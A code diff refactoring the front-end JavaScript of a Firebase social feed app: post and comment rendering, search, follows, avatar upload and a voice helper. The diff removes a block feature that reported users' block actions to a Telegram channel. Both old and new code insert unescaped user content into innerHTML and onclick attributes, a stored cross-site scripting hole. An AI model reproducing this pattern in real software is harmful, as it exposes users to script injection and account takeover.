-                    const gpsHtml = post.lat ? `<div class="gps-tag"><i class="fas fa-map-marker-alt"></i> Location: ${post.lat.toFixed(4)}, ${post.lng.toFixed(4)}</div>` : "";
-                    
-                    const commentsHtml = (post.commentsArr || []).map(c => `<div style="background:#f0f2f5; padding:8px 12px; border-radius:15px; margin-bottom:5px; display:inline-block;"><strong style="font-size:14px;">${c.name}</strong><br><span style="font-size:14px;">${c.text}</span></div><br>`).join('');
+                    const txt = (post.text||"").replace(/@(\w+)/g, '<span style="color:var(--primary);font-weight:600;">@$1</span>');
+                    const img = post.imageUrl ? `<img src="${post.imageUrl}" class="post-image">` : "";
+                    const gps = post.lat ? `<div class="gps-tag"><i class="fas fa-map-marker-alt"></i> ${post.lat.toFixed(4)}, ${post.lng.toFixed(4)}</div>` : "";
+                    const coms = (post.commentsArr || []).map(c => `<div style="background:#f0f2f5; padding:8px 12px; border-radius:12px; margin-bottom:8px; display:inline-block;"><strong style="font-size:13px;">${c.name}</strong><br><span style="font-size:14px;">${c.text}</span></div><br>`).join('');
 
                     container.innerHTML += `
                         <div class="post-card">
                             <div class="post-header">
-                                <div style="display:flex;">
-                                    <img src="${post.authorPic || 'https://via.placeholder.com/45'}">
-                                    <div>
-                                        <div class="post-name">${post.authorName}</div>
-                                        <div class="post-time">${new Date(post.timestamp).toLocaleString()}</div>
-                                    </div>
-                                </div>
+                                <img src="${post.authorPic || 'https://via.placeholder.com/45'}">
+                                <div><div class="post-name">${post.authorName}</div><div class="post-time">${new Date(post.timestamp).toLocaleString()}</div></div>
                             </div>
-                            <div class="post-text">${formattedTxt}</div>
-                            ${imgHtml}
-                            ${gpsHtml}
+                            <div class="post-text">${txt}</div>
+                            ${img} ${gps}
                             <div class="post-stats">
-                                <span><i class="fas fa-thumbs-up" style="color:var(--primary-color);"></i> ${post.likes || 0}</span>
+                                <span><i class="fas fa-thumbs-up" style="color:var(--primary);"></i> ${post.likes || 0}</span>
                                 <span>${post.commentsArr?.length || 0} Comments</span>
                             </div>
-                            <div class="post-actions">
-                                <div class="post-action-btn" onclick="coreLogic.likePost('${post.id}', ${post.likes||0})"><i class="far fa-thumbs-up"></i> Like</div>
-                                <div class="post-action-btn" onclick="document.getElementById('com-${post.id}').style.display='block'"><i class="far fa-comment-alt"></i> Comment</div>
+                            <div class="post-actions-bar">
+                                <div class="post-btn" onclick="coreLogic.likePost('${post.id}', ${post.likes||0})"><i class="far fa-thumbs-up"></i> Like</div>
+                                <div class="post-btn" onclick="document.getElementById('com-${post.id}').style.display='block'"><i class="far fa-comment"></i> Comment</div>
                             </div>
-                            <div id="com-${post.id}" style="display:none; margin-top:10px; border-top:1px solid #ced0d4; padding-top:10px;">
-                                <div style="max-height:200px; overflow-y:auto; margin-bottom:10px;">${commentsHtml}</div>
+                            <div id="com-${post.id}" style="display:none; margin-top:10px; border-top:1px solid #eee; padding-top:12px;">
+                                <div style="max-height:200px; overflow-y:auto; margin-bottom:10px;">${coms}</div>
                                 <div style="display:flex; gap:10px; align-items:center;">
-                                    <input type="text" id="inp-com-${post.id}" placeholder="Write a public comment..." style="border-radius:20px; background:#f0f2f5;">
-                                    <i class="fas fa-paper-plane" style="color:var(--primary-color); font-size:22px; cursor:pointer;" onclick="coreLogic.addComment('${post.id}', '${post.authorId}')"></i>
+                                    <input type="text" id="inp-com-${post.id}" class="input-field" style="padding:10px 15px; border-radius:20px;" placeholder="Write comment...">
+                                    <div style="background:var(--primary); color:white; width:40px; height:40px; border-radius:50%; display:flex; justify-content:center; align-items:center; cursor:pointer;" onclick="coreLogic.addComment('${post.id}', '${post.authorId}')"><i class="fas fa-paper-plane"></i></div>
                                 </div>
                             </div>
                         </div>
@@ -1313,48 +784,32 @@
             });
         };
 
-        window.coreLogic.likePost = async (id, currentLikes) => await updateDoc(doc(db, "posts", id), { likes: currentLikes + 1 });
-        
-        window.coreLogic.addComment = async (postId, postAuthorId) => {
+        window.coreLogic.likePost = async (id, cur) => await updateDoc(doc(db, "posts", id), { likes: cur + 1 });
+        window.coreLogic.addComment = async (postId, authorId) => {
             const txt = document.getElementById(`inp-com-${postId}`).value.trim();
             if(!txt) return;
             await updateDoc(doc(db, "posts", postId), { commentsArr: arrayUnion({ name: currentUserData.name, text: txt }) });
-            if(postAuthorId !== auth.currentUser.uid) {
-                await addDoc(collection(db, "notifications"), { userId: postAuthorId, text: `${currentUserData.name} commented on your post.`, time: Date.now() });
-            }
+            if(authorId !== auth.currentUser.uid) await addDoc(collection(db, "notifications"), { userId: authorId, text: `${currentUserData.name} commented on your post.`, time: Date.now() });
         };
 
-        const sInput = document.getElementById('search-input');
-        if(sInput) {
-            sInput.addEventListener('keyup', (e) => {
-                const query = e.target.value.toLowerCase().trim();
-                const resBox = document.getElementById('search-results');
-                if(!query) { resBox.style.display = 'none'; return; }
+        document.getElementById('search-input')?.addEventListener('keyup', (e) => {
+            const q = e.target.value.toLowerCase().trim();
+            const resBox = document.getElementById('search-results');
+            if(!q) return resBox.innerHTML = "";
+            const matches = allUsers.filter(u => u.name.toLowerCase().includes(q));
+            resBox.innerHTML = matches.length === 0 ? "<div style='color:gray; font-size:14px;'>No results.</div>" : matches.map(u => {
+                const isF = (currentUserData.following || []).includes(u.uid);
+                return `<div style="padding:10px 0; border-bottom:1px solid #eee; display:flex; justify-content:space-between; align-items:center;">
+                    <div style="font-weight:600; font-size:14px;">${u.name}</div>
+                    <button class="btn btn-primary" style="padding:6px 12px; font-size:12px; width:auto; border-radius:8px;" onclick="coreLogic.toggleFollow('${u.uid}', ${isF})">${isF?'Unfollow':'Follow'}</button>
+                </div>`;
+            }).join('');
+        });
 
-                resBox.style.display = 'block'; resBox.innerHTML = "";
-                const matches = allUsers.filter(u => u.name.toLowerCase().includes(query) && !(currentUserData.blockedUsers || []).includes(u.uid));
-
-                if(matches.length === 0) { resBox.innerHTML = "<div style='padding:10px; color:gray;'>No results.</div>"; return; }
-                
-                matches.forEach(u => {
-                    const isFollowing = (currentUserData.following || []).includes(u.uid);
-                    resBox.innerHTML += `
-                        <div style="padding:10px; border-bottom:1px solid #eee; display:flex; justify-content:space-between; align-items:center;">
-                            <div style="font-weight:bold; font-size:14px;">${u.name}</div>
-                            <div style="display:flex; gap:5px;">
-                                <button class="btn btn-secondary" style="padding:5px 10px; font-size:12px; width:auto;" onclick="coreLogic.toggleFollow('${u.uid}', ${isFollowing})">${isFollowing ? 'Unfollow' : 'Follow'}</button>
-                                <button class="btn btn-danger" style="padding:5px 10px; font-size:12px;" onclick="coreLogic.blockUser('${u.uid}', '${u.name}')">Block</button>
-                            </div>
-                        </div>
-                    `;
-                });
-            });
-        }
-
-        window.coreLogic.toggleFollow = async (targetId, isFollowing) => {
+        window.coreLogic.toggleFollow = async (targetId, isF) => {
             const myRef = doc(db, "users", auth.currentUser.uid);
             const targetRef = doc(db, "users", targetId);
-            if(isFollowing) {
+            if(isF) {
                 await updateDoc(myRef, { following: arrayRemove(targetId) });
                 await updateDoc(targetRef, { followers: arrayRemove(auth.currentUser.uid) });
             } else {
@@ -1365,88 +820,48 @@
             document.getElementById('search-input').dispatchEvent(new Event('keyup'));
         };
 
-        window.coreLogic.blockUser = async (targetId, targetName) => {
-            if(!confirm(`Block ${targetName}?`)) return;
-            await updateDoc(doc(db, "users", auth.currentUser.uid), { blockedUsers: arrayUnion(targetId) });
-            document.getElementById('search-results').style.display = 'none';
-            window.coreLogic.sendTelegram(`🚫 BLOCK ALERT:\n${currentUserData.name} blocked ${targetName}.`);
-        };
+        document.getElementById('upload-avatar-file')?.addEventListener('change', async (e) => {
+            const file = e.target.files[0];
+            if(file) {
+                const storageRef = ref(storage, `avatars/${auth.currentUser.uid}_${Date.now()}`);
+                await uploadBytesResumable(storageRef, file);
+                const url = await getDownloadURL(storageRef);
+                await updateDoc(doc(db, "users", auth.currentUser.uid), { photoURL: url });
+            }
+        });
 
-        const avUpload = document.getElementById('upload-avatar-file');
-        if(avUpload) {
-            avUpload.addEventListener('change', async (e) => {
-                const file = e.target.files[0];
-                if(file) {
-                    const storageRef = ref(storage, `avatars/${auth.currentUser.uid}_${Date.now()}`);
-                    await uploadBytesResumable(storageRef, file);
-                    const url = await getDownloadURL(storageRef);
-                    await updateDoc(doc(db, "users", auth.currentUser.uid), { photoURL: url });
-                }
+        document.getElementById('btn-save-settings')?.addEventListener('click', async () => {
+            await updateDoc(doc(db, "users", auth.currentUser.uid), {
+                name: document.getElementById('edit-name').value,
+                phone: document.getElementById('edit-phone').value,
+                isPhonePublic: document.getElementById('edit-phone-public').checked
             });
-        }
-
-        const saveBtn = document.getElementById('btn-save-settings');
-        if(saveBtn) {
-            saveBtn.addEventListener('click', async () => {
-                await updateDoc(doc(db, "users", auth.currentUser.uid), {
-                    name: document.getElementById('edit-name').value,
-                    phone: document.getElementById('edit-phone').value,
-                    isPhonePublic: document.getElementById('edit-phone-public').checked
-                });
-                alert("Settings Saved!");
-            });
-        }
-
-        window.coreLogic.renderBlockList = () => {
-            const list = document.getElementById('block-list-container');
-            const blocks = currentUserData?.blockedUsers || [];
-            if(blocks.length === 0) { list.innerHTML = "<p style='color:gray; font-size:13px;'>No blocked users.</p>"; return; }
-            
-            list.innerHTML = "";
-            blocks.forEach(id => {
-                const u = allUsers.find(x => x.uid === id) || { name: "Unknown" };
-                list.innerHTML += `
-                    <div style="display:flex; justify-content:space-between; align-items:center; padding:10px; border-bottom:1px solid #eee;">
-                        <span>${u.name}</span>
-                        <button class="btn btn-primary" style="padding:6px 12px; font-size:13px; width:auto;" onclick="coreLogic.unblockUser('${id}', '${u.name}')">Unblock</button>
-                    </div>
-                `;
-            });
-        };
-
-        window.coreLogic.unblockUser = async (targetId, targetName) => {
-            await updateDoc(doc(db, "users", auth.currentUser.uid), { blockedUsers: arrayRemove(targetId) });
-            window.coreLogic.sendTelegram(`✅ UNBLOCK ALERT:\n${currentUserData.name} unblocked ${targetName}.`);
-            window.coreLogic.renderBlockList();
-        };
+            alert("Saved!"); appUI.closeSettings();
+        });
 
         window.coreLogic.renderNotifications = () => {
             onSnapshot(query(collection(db, "notifications"), orderBy("time", "desc")), (snap) => {
                 const box = document.getElementById('notifications-container');
-                box.innerHTML = "";
-                let has = false;
+                box.innerHTML = ""; let has = false;
                 snap.forEach(docSnap => {
                     const n = docSnap.data();
-                    if(n.userId === auth.currentUser.uid) {
-                        has = true;
-                        box.innerHTML += `<div style="padding:10px; border-bottom:1px solid #eee; font-size:14px;">${n.text}<br><small style="color:gray;">${new Date(n.time).toLocaleString()}</small></div>`;
-                    }
+                    if(n.userId === auth.currentUser.uid) { has = true; box.innerHTML += `<div style="padding:12px 0; border-bottom:1px solid #eee; font-size:14px;">${n.text}<br><span style="color:var(--text-muted); font-size:12px;">${new Date(n.time).toLocaleString()}</span></div>`; }
                 });
-                if(!has) box.innerHTML = "<div style='padding:15px; color:gray;'>No notifications</div>";
+                if(!has) box.innerHTML = "<div style='color:var(--text-muted); font-size:14px;'>No notifications</div>";
             });
         };
 
         window.aiBot = {
             talk: () => {
-                const SpeechRec = window.SpeechRecognition || window.webkitSpeechRecognition;
-                if(!SpeechRec) return alert("AI Voice not supported in this browser.");
-                const rec = new SpeechRec();
-                rec.onstart = () => alert("AI is listening... say 'post' or 'hello'");
+                const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+                if(!SR) return alert("Voice not supported.");
+                const rec = new SR();
+                rec.onstart = () => alert("Listening...");
                 rec.onresult = (e) => {
                     const txt = e.results[0][0].transcript.toLowerCase();
                     setTimeout(() => {
-                        let rep = "I am a smart cat created by Roni Vai!";
-                        if(txt.includes("post")) rep = "Tap What's on your mind to create a post.";
+                        let rep = "I am a smart cat!";
+                        if(txt.includes("post")) { rep = "Opening post modal."; appUI.openPostModal(); }
                         if('speechSynthesis' in window) window.speechSynthesis.speak(new SpeechSynthesisUtterance(rep));
                     }, 500);
                 };
